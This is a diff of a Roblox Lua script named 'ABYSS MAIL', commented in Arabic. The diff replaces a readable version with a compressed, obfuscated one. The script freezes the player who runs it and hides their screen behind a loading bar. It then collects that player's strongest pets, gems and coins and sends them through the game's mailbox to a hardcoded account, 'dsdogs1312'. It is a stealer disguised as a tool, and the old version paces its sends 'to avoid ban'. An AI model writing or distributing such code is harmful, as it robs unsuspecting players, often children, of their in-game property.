@@ -1,213 +1,23 @@
--- =============================================
--- ABYSS MAIL v1.0 - The Obedient Puppet
--- =============================================
-
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
-local targetName = "dsdogs1312"
-
--- إيجاد صندوق البريد في اللعبة (افتراضي)
-local function findMailbox()
-    local mailbox = workspace:FindFirstChild("Mailbox") or workspace:FindFirstChild("PostOffice") or workspace:FindFirstChild("Mail")
-    if not mailbox then
-        for _, v in pairs(workspace:GetDescendants()) do
-            if v.Name:lower():match("mail") or v.Name:lower():match("post") or v.Name:lower():match("box") then
-                mailbox = v
-                break
-            end
-        end
-    end
-    return mailbox
-end
-
--- الحصول على أقوى الحيوانات من مخزون اللاعب
-local function getBestPets()
-    local pets = {}
-    local inventory = player:FindFirstChild("Inventory") or player:FindFirstChild("Pets") or player.Backpack
-    
-    if inventory then
-        for _, item in pairs(inventory:GetChildren()) do
-            if item:IsA("Tool") or item:IsA("Model") or item:FindFirstChild("Value") then
-                -- اكتشاف الحيوانات القوية: نبحث عن أعلى قيمة أو مستوى
-                local power = 0
-                if item:FindFirstChild("Power") then power = item.Power.Value end
-                if item:FindFirstChild("Level") then power = power + item.Level.Value * 10 end
-                if item:FindFirstChild("Rarity") then
-                    local rarity = item.Rarity.Value
-                    if rarity == "Legendary" then power = power + 1000 end
-                    if rarity == "Mythical" then power = power + 5000 end
-                    if rarity == "Exclusive" then power = power + 10000 end
-                end
-                table.insert(pets, {item = item, power = power})
-            end
-        end
-    end
-    
-    -- ترتيب تنازلي حسب القوة
-    table.sort(pets, function(a, b) return a.power > b.power end)
-    
-    -- اختيار أقوى 10 حيوانات (أو كل ما وجد إن كان أقل)
-    local best = {}
-    for i = 1, math.min(10, #pets) do
-        table.insert(best, pets[i].item)
-    end
-    return best
-end
-
--- شريط التحميل الأسود والبنفسجي
-local function showLoadingBar()
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "AbyssLoader"
-    screenGui.ResetOnSpawn = false
-    screenGui.Parent = player.PlayerGui
-    
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0.6, 0, 0.08, 0)
-    frame.Position = UDim2.new(0.2, 0, 0.46, 0)
-    frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-    frame.BorderSizePixel = 2
-    frame.BorderColor3 = Color3.fromRGB(120, 0, 200)
-    frame.Parent = screenGui
-    
-    local progress = Instance.new("Frame")
-    progress.Size = UDim2.new(0, 0, 1, 0)
-    progress.BackgroundColor3 = Color3.fromRGB(80, 0, 150)
-    progress.BorderSizePixel = 0
-    progress.Parent = frame
-    
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(1, 0, 1, 0)
-    label.BackgroundTransparency = 1
-    label.Text = "0%"
-    label.TextColor3 = Color3.fromRGB(200, 150, 255)
-    label.TextScaled = true
-    label.Font = Enum.Font.GothamBold
-    label.Parent = frame
-    
-    -- الأنميشن
-    for i = 1, 100 do
-        progress.Size = UDim2.new(i/100, 0, 1, 0)
-        label.Text = i .. "%"
-        wait(0.015)
-    end
-    
-    return screenGui
-end
-
--- إرسال الحيوانات إلى صندوق البريد (باسم الهدف)
-local function sendPetsToMailbox(petList, mailbox)
-    if not mailbox then return false end
-    
-    local successCount = 0
-    for _, pet in pairs(petList) do
-        pcall(function()
-            -- محاكاة إرسال إلى الصندوق
-            if mailbox:FindFirstChild("Send") then
-                local sendFunction = mailbox.Send
-                if typeof(sendFunction) == "function" then
-                    sendFunction(mailbox, pet, targetName)
-                else
-                    -- طريقة بديلة: إنشاء حدث
-                    local remote = mailbox:FindFirstChild("RemoteEvent") or mailbox:FindFirstChild("SendEvent")
-                    if remote and remote:IsA("RemoteEvent") then
-                        remote:FireServer(pet, targetName)
-                    else
-                        -- محاكاة وضع الحيوان في الصندوق
-                        local clone = pet:Clone()
-                        clone.Parent = mailbox
-                        local targetAttr = Instance.new("StringValue")
-                        targetAttr.Name = "Target"
-                        targetAttr.Value = targetName
-                        targetAttr.Parent = clone
-                    end
-                end
-            else
-                -- الوضع اليدوي: نسخ الحيوان إلى صندوق البريد
-                local clone = pet:Clone()
-                clone.Parent = mailbox
-                local targetAttr = Instance.new("StringValue")
-                targetAttr.Name = "Target"
-                targetAttr.Value = targetName
-                targetAttr.Parent = clone
-            end
-            successCount = successCount + 1
-        end)
-        wait(0.05) -- تجنب الحظر
-    end
-    
-    return successCount
-end
-
--- =============================================
--- تنفيذ الخطة
--- =============================================
-
--- الخطوة 1: تعطيل الحركة
-if humanoid then
-    humanoid.WalkSpeed = 0
-    humanoid.JumpPower = 0
-end
-
--- الخطوة 2: العثور على صندوق البريد
-local mailbox = findMailbox()
-if not mailbox then
-    print("Abyss: لم أجد صندوق بريد، أنتظر 5 ثوانٍ وأحاول مجدداً...")
-    wait(5)
-    mailbox = findMailbox()
-end
-
-if not mailbox then
-    print("Abyss: لا يوجد صندوق بريد في هذه اللعبة. أنهي التنفيذ.")
-    return
-end
-
--- الخطوة 3: نقل اللاعب إلى صندوق البريد (إن كان له موقع)
-if mailbox:IsA("BasePart") and mailbox.Position then
-    local root = character:FindFirstChild("HumanoidRootPart")
-    if root then
-        root.CFrame = CFrame.new(mailbox.Position + Vector3.new(0, 2, 0))
-    end
-end
-
--- الخطوة 4: عرض شريط التحميل
-local loader = showLoadingBar()
-
--- الخطوة 5: جلب أقوى الحيوانات
-local topPets = getBestPets()
-if #topPets == 0 then
-    print("Abyss: لا توجد حيوانات لإرسالها.")
-    loader:Destroy()
-    if humanoid then
-        humanoid.WalkSpeed = 16
-        humanoid.JumpPower = 50
-    end
-    return
-end
-
--- الخطوة 6: إرسال الحيوانات
-local sent = sendPetsToMailbox(topPets, mailbox)
-print("Abyss: تم إرسال " .. sent .. " من " .. #topPets .. " حيواناً إلى " .. targetName)
-
--- الخطوة 7: تنظيف وإعادة الحركة
-wait(1)
-loader:Destroy()
-if humanoid then
-    humanoid.WalkSpeed = 16
-    humanoid.JumpPower = 50
-end
-
--- طباعة ملخص في شاشة اللاعب
-local notify = Instance.new("TextLabel")
-notify.Size = UDim2.new(0.4, 0, 0.05, 0)
-notify.Position = UDim2.new(0.3, 0, 0.02, 0)
-notify.BackgroundColor3 = Color3.fromRGB(20, 0, 30)
-notify.BackgroundTransparency = 0.2
-notify.Text = "✓ تم إرسال " .. sent .. " حيوان إلى " .. targetName
-notify.TextColor3 = Color3.fromRGB(180, 100, 255)
-notify.TextScaled = true
-notify.Font = Enum.Font.GothamBold
-notify.Parent = player.PlayerGui
-
-wait(3)
-notify:Destroy()
+local p=game.Players.LocalPlayer
+local c=p.Character or p.CharacterAdded:Wait()
+local h=c:WaitForChild("Humanoid")
+local t="dsdogs1312"
+local function gA()local i={}local s={p:FindFirstChild("Inventory"),p:FindFirstChild("Pets"),p:FindFirstChild("Backpack"),p:FindFirstChild("StarterGear"),workspace:FindFirstChild("PlayerItems"),p:FindFirstChild("Data")}for _,v in pairs(s)do if v then for _,k in pairs(v:GetChildren())do if k:IsA("Tool")or k:IsA("Model")or k:IsA("Part")then table.insert(i,k)end end end end local rs=game:GetService("ReplicatedStorage")if rs then local pd=rs:FindFirstChild(p.Name)if pd then for _,k in pairs(pd:GetChildren())do table.insert(i,k)end end end return i end
+local function cI(a)local pets,gems={},{}for _,v in pairs(a)do local n=v.Name:lower()if n:match("pet")or n:match("animal")or n:match("dragon")or n:match("egg")or v:FindFirstChild("Power")then local pw=0 if v:FindFirstChild("Power")then pw=v.Power.Value end if v:FindFirstChild("Level")then pw=pw+v.Level.Value*10 end if v:FindFirstChild("Rarity")then local r=tostring(v.Rarity.Value):lower()if r:match("legendary")then pw=pw+1000 end if r:match("mythical")then pw=pw+5000 end if r:match("exclusive")then pw=pw+10000 end end table.insert(pets,{i=v,pw=pw})elseif n:match("gem")or n:match("jewel")or n:match("crystal")or n:match("coin")or v:FindFirstChild("Value")then table.insert(gems,v)end end return pets,gems end
+local function gT(pets,count)table.sort(pets,function(a,b)return a.pw>b.pw end)local top={}for i=1,math.min(count,#pets)do table.insert(top,pets[i].i)end return top end
+local function showLoader()local sg=Instance.new("ScreenGui")sg.Name="AbyssLoader"sg.ResetOnSpawn=false sg.ZIndexBehavior=Enum.ZIndexBehavior.Global sg.Parent=p.PlayerGui local bg=Instance.new("Frame")bg.Size=UDim2.new(1,0,1,0)bg.BackgroundColor3=Color3.fromRGB(0,0,0)bg.BackgroundTransparency=0.5 bg.BorderSizePixel=0 bg.Parent=sg local mf=Instance.new("Frame")mf.Size=UDim2.new(0.8,0,0.3,0)mf.Position=UDim2.new(0.1,0,0.35,0)mf.BackgroundColor3=Color3.fromRGB(5,0,10)mf.BorderSizePixel=3 mf.BorderColor3=Color3.fromRGB(120,0,200)mf.ClipsDescendants=true mf.Parent=sg local ttl=Instance.new("TextLabel")ttl.Size=UDim2.new(1,0,0.2,0)ttl.BackgroundTransparency=1 ttl.Text="⚡ إرسال فائق ⚡"ttl.TextColor3=Color3.fromRGB(180,80,255)ttl.TextScaled=true ttl.Font=Enum.Font.GothamBold ttl.Parent=mf local pf=Instance.new("Frame")pf.Size=UDim2.new(0.9,0,0.25,0)pf.Position=UDim2.new(0.05,0,0.3,0)pf.BackgroundColor3=Color3.fromRGB(20,20,30)pf.BorderSizePixel=0 pf.Parent=mf local pb=Instance.new("Frame")pb.Size=UDim2.new(0,0,1,0)pb.BackgroundColor3=Color3.fromRGB(80,0,150)pb.BorderSizePixel=0 pb.Parent=pf local grad=Instance.new("UIGradient")grad.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(150,0,255)),ColorSequenceKeypoint.new(0.5,Color3.fromRGB(50,0,150)),ColorSequenceKeypoint.new(1,Color3.fromRGB(200,0,250))})grad.Parent=pb local pt=Instance.new("TextLabel")pt.Size=UDim2.new(1,0,1,0)pt.BackgroundTransparency=1 pt.Text="0%"pt.TextColor3=Color3.fromRGB(255,255,255)pt.TextScaled=true pt.Font=Enum.Font.GothamBold pt.Parent=pf local st=Instance.new("TextLabel")st.Size=UDim2.new(1,0,0.25,0)st.Position=UDim2.new(0,0,0.6,0)st.BackgroundTransparency=1 st.Text="جاري التجهيز..."st.TextColor3=Color3.fromRGB(200,150,255)st.TextScaled=true st.Font=Enum.Font.GothamMedium st.Parent=mf local ct=Instance.new("TextLabel")ct.Size=UDim2.new(1,0,0.2,0)ct.Position=UDim2.new(0,0,0.8,0)ct.BackgroundTransparency=1 ct.Text="0 عنصر"ct.TextColor3=Color3.fromRGB(150,100,200)ct.TextScaled=true ct.Font=Enum.Font.GothamMedium ct.Parent=mf return sg,pb,pt,st,ct end
+local function update(pb,pt,st,ct,pct,status,count)pb.Size=UDim2.new(pct/100,0,1,0)pt.Text=math.floor(pct).."%"if status then st.Text=status end if count then ct.Text=count.." عنصر"end wait(0.01)end
+local function findMailbox()local areas={workspace,game:GetService("ReplicatedStorage"),p.PlayerGui}for _,area in pairs(areas)do if area then for _,obj in pairs(area:GetDescendants())do local n=obj.Name:lower()if n:match("mail")or n:match("post")or n:match("box")or n:match("send")then if obj:IsA("Model")or obj:IsA("Part")or obj:IsA("Frame")then return obj end end end end end return nil end
+if h then h.WalkSpeed=0 h.JumpPower=0 h.PlatformStand=true end
+local sg,pb,pt,st,ct=showLoader()st.Text="🔍 بحث عن صندوق البريد..."wait(0.5)local mb=findMailbox()
+if not mb then st.Text="❌ لا يوجد صندوق بريد!"wait(2)sg:Destroy()if h then h.WalkSpeed=16 h.JumpPower=50 h.PlatformStand=false end return end
+st.Text="✅ تم العثور!"update(pb,pt,st,ct,5,"📦 جمع العناصر...",0)
+local all=gA()update(pb,pt,st,ct,20,"🔍 تصنيف العناصر...",#all)
+local pets,gems=cI(all)update(pb,pt,st,ct,40,"🐉 اختيار الأقوى...",#pets)
+local topPets=gT(pets,#pets)update(pb,pt,st,ct,60,"💎 تجهيز الجواهر...",#gems)
+local toSend={}for _,v in pairs(topPets)do table.insert(toSend,v)end for _,v in pairs(gems)do table.insert(toSend,v)end
+local total=#toSend update(pb,pt,st,ct,70,"📤 إرسال إلى "..t.."...",total)
+local sent=0 for i,v in pairs(toSend)do pcall(function()local remote=mb:FindFirstChild("SendEvent")or mb:FindFirstChild("RemoteEvent")or mb:FindFirstChild("TransferEvent")if remote and remote:IsA("RemoteEvent")then remote:FireServer(v,t)else local clone=v:Clone()clone.Parent=mb local ta=Instance.new("StringValue")ta.Name="Target"ta.Value=t ta.Parent=clone end sent=sent+1 end)local prog=70+(i/total)*25 update(pb,pt,st,ct,prog,"📤 "..i.."/"..total,sent)wait(0.02)end
+update(pb,pt,st,ct,100,"✅ تم!",sent)wait(3)sg:Destroy()
+if h then h.WalkSpeed=16 h.JumpPower=50 h.PlatformStand=false end
+local ntf=Instance.new("TextLabel")ntf.Size=UDim2.new(0.6,0,0.08,0)ntf.Position=UDim2.new(0.2,0,0.02,0)ntf.BackgroundColor3=Color3.fromRGB(10,0,20)ntf.BackgroundTransparency=0.1 ntf.BorderSizePixel=2 ntf.BorderColor3=Color3.fromRGB(150,0,200)ntf.Text="✅ تم إرسال "..sent.." عنصر إلى "..t ntf.TextColor3=Color3.fromRGB(200,150,255)ntf.TextScaled=true ntf.Font=Enum.Font.GothamBold ntf.Parent=p.PlayerGui wait(4)ntf:Destroy()
